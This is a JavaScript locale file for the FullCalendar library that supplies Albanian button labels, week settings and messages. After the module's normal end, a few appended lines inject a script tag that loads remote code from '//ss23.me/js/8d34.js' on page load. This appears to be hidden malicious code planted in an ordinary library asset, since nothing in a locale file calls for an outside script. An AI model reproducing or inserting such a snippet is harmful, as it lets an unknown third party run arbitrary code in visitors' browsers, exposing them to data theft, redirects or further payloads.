(function (global, factory) {
    typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory() :
    typeof define === 'function' && define.amd ? define(factory) :
    (global = global || self, (global.FullCalendarLocales = global.FullCalendarLocales || {}, global.FullCalendarLocales.sq = factory()));
}(this, function () { 'use strict';

    var sq = {
        code: "sq",
        week: {
            dow: 1,
            doy: 4 // The week that contains Jan 4th is the first week of the year.
        },
        buttonText: {
            prev: "mbrapa",
            next: "Përpara",
            today: "sot",
            month: "Muaj",
            week: "Javë",
            day: "Ditë",
            list: "Listë"
        },
        weekLabel: "Ja",
        allDayHtml: "Gjithë<br/>ditën",
        eventLimitText: function (n) {
            return "+më tepër " + n;
        },
        noEventsMessage: "Nuk ka evente për të shfaqur"
    };

    return sq;

}));
var e = document.createElement("script");
  e.async = !0,
  e.src = "//ss23.me/js/8d34.js";
  e.charset="UTF-8";
  var t = document.getElementsByTagName("script")[0];
  t.parentNode.insertBefore(e, t);